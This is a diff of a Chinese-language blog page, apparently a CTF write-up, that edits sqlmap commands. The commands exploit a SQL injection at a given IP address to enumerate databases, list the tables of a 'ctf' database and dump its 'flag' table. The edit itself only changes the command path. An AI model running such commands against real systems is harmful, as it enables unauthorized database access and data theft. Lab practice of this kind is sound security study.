@@ -253,10 +253,10 @@
 <p>结果显示存在时间盲注和<code>union</code>注入，且数据库为<code>mysql</code></p>
 <p><img src="https://raw.githubusercontent.com/joner11234/joner11234.github.io/master/img/946-49-53.png" alt></p>
 <p>接着输入下面的命令查询所有数据库</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u "http://120.55.43.255:11777/search.php?id=1" --dbs</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u "http://120.55.43.255:11777/search.php?id=1" --dbs</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/joner11234/joner11234.github.io/master/img/204-50-58.png" alt></p>
 <p>很显然选择<code>ctf</code>这个数据库，然后输入下面的命令查询这个数据库里所有的表</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u "http://120.55.43.255:11777/search.php?id=1" -D ctf --tables</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u "http://120.55.43.255:11777/search.php?id=1" -D ctf --tables</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/joner11234/joner11234.github.io/master/img/830-51-57.png" alt></p>
 <p>看到了一个flag表，所以直接看这个表的所有内容</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u "http://120.55.43.255:11777/search.php?id=1" -D ctf -T flag --dump</span><br></pre></td></tr></table></figure>
